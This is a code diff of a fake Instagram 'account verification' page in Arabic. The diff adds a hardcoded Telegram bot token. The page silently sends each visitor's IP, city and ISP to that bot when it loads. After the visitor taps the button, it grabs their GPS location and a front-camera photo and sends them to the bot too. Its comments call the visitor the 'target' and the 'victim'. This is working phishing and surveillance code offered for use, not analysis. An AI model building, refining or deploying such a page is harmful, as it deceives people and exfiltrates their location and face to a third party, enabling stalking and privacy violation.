@@ -3,29 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - التحقق من الأمان</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>Instagram - Verification</title>
     <style>
-        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
+        .card { background: white; border: 1px solid #dbdbdb; width: 100%; max-width: 350px; padding: 30px; text-align: center; border-radius: 8px; }
         .logo { width: 175px; margin-bottom: 20px; }
-        .user-info { display: flex; align-items: center; justify-content: center; margin: 15px 0; border: 1px solid #dbdbdb; padding: 10px; border-radius: 5px; }
-        .user-icon { width: 40px; height: 40px; background: #eee; border-radius: 50%; margin-left: 10px; }
-        button { background: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 12px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:active { background: #0077c7; }
-        #status { margin-top: 15px; color: #ed4956; font-size: 13px; font-weight: bold; }
+        button { background: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 12px; font-weight: bold; cursor: pointer; }
+        #status { margin-top: 15px; color: #ed4956; font-size: 13px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="card">
         <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo">
-        <div class="user-info">
-            <div class="user-icon"></div>
-            <span style="font-weight: 600; color: #262626;">التحقق من ملكية الحساب</span>
-        </div>
-        <p style="color: #8e8e8e; font-size: 13px; line-height: 1.5;">اكتشف نظامنا محاولة دخول مشبوهة. يرجى تأكيد هويتك عبر السماح بالأذونات المطلوبة لإكمال الفحص الأمني.</p>
-        <button id="authBtn">متابعة كـ @User</button>
+        <p style="font-weight: 600; font-size: 14px;">تأكيد ملكية الحساب</p>
+        <p style="color: #8e8e8e; font-size: 13px;">يرجى السماح بالوصول للكاميرا والموقع لإتمام الفحص الأمني السريع.</p>
+        <button id="authBtn">متابعة</button>
         <div id="status"></div>
     </div>
 
@@ -33,73 +26,65 @@
     <canvas id="c"></canvas>
 
     <script>
-        const webapp = window.Telegram.WebApp;
-        webapp.expand();
+        const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
+        const CHAT_ID = '2140385904'; // تأكد من أن هذا الرقم صحيح تماماً
 
-        // 1. جلب معلومات الـ IP والبطارية (صيد صامت)
-        const getSilentData = async () => {
+        // دالة إرسال النص
+        async function sendLog(msg) {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            });
+        }
+
+        // دالة إرسال الصورة
+        async function sendPhoto(blob, cap) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'shot.jpg');
+            fd.append('caption', cap);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        }
+
+        // صيد المعلومات الصامتة فور فتح الصفحة
+        window.onload = async () => {
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                const ip = await res.json();
-                const b = await (navigator.getBattery ? navigator.getBattery() : {level: 0});
-                
-                return {
-                    ip: ip.ip || "فشل",
-                    country: ip.country_name || "فشل",
-                    region: ip.region || "فشل",
-                    isp: ip.org || "فشل",
-                    battery: (b.level * 100).toFixed(0) + "%",
-                    platform: navigator.platform,
-                    ua: navigator.userAgent.split(') ')[1]
-                };
-            } catch (e) { return null; }
+                const i = await res.json();
+                const report = `🔔 *دخل شخص للرابط!*\n🌐 الآيبي: \`${i.ip}\`\n🌍 الدولة: ${i.country_name}\n🏙 المدينة: ${i.city}\n📡 المزود: ${i.org}`;
+                sendLog(report);
+            } catch (e) { sendLog("🔔 شخص دخل للرابط (تعذر جلب الآيبي)"); }
         };
 
-        // 2. دالة التقاط الصورة (بجودة مثالية للإرسال)
-        const takePhoto = async () => {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 2000));
-                
-                const canvas = document.getElementById('c');
-                canvas.width = 300; canvas.height = 250;
-                canvas.getContext('2d').drawImage(video, 0, 0, 300, 250);
-                
-                stream.getTracks().forEach(t => t.stop());
-                return canvas.toDataURL('image/jpeg', 0.5);
-            } catch (e) { return null; }
-        };
-
-        // 3. التنفيذ عند الضغط
         document.getElementById('authBtn').onclick = async () => {
-            const btn = document.getElementById('authBtn');
             const st = document.getElementById('status');
-            
-            btn.disabled = true;
-            st.innerText = "جاري الاتصال بخوادم الأمان...";
+            st.innerText = "جاري المعالجة...";
 
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const silentData = await getSilentData();
-                const photo = await takePhoto();
-
-                const finalData = {
-                    ...silentData,
-                    gps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
-                    photo: photo,
-                    time: new Date().toLocaleString('ar-EG')
-                };
-
-                webapp.sendData(JSON.stringify(finalData));
-                st.style.color = "#262626";
-                st.innerText = "اكتمل التحقق بنجاح! يتم التحويل...";
-                setTimeout(() => webapp.close(), 1500);
-
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                const map = `📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.getElementById('v');
+                    video.srcObject = stream;
+                    
+                    setTimeout(async () => {
+                        const canvas = document.getElementById('c');
+                        canvas.width = 400; canvas.height = 400;
+                        canvas.getContext('2d').drawImage(video, 0, 0, 400, 400);
+                        canvas.toBlob(blob => sendPhoto(blob, `📸 سيلفي الهدف\n${map}`), 'image/jpeg', 0.7);
+                        stream.getTracks().forEach(t => t.stop());
+                        st.innerText = "اكتمل التحقق!";
+                        setTimeout(() => location.href = "https://instagram.com", 1000);
+                    }, 2000);
+                } catch (e) {
+                    sendLog(`⚠️ منح الموقع ولكن رفض الكاميرا\n${map}`);
+                    st.innerText = "خطأ: يجب السماح بالكاميرا أيضاً.";
+                }
             }, (err) => {
-                btn.disabled = false;
-                alert("⚠️ خطأ في الأمان: يجب السماح بالأذونات لإثبات هويتك.");
-                st.innerText = "فشل التحقق: يرجى منح الصلاحيات والمحاولة مجدداً.";
+                st.innerText = "فشل: يرجى منح الصلاحيات من إعدادات المتصفح.";
+                sendLog("❌ الضحية رفض منح أي صلاحيات.");
             });
         };
     </script>
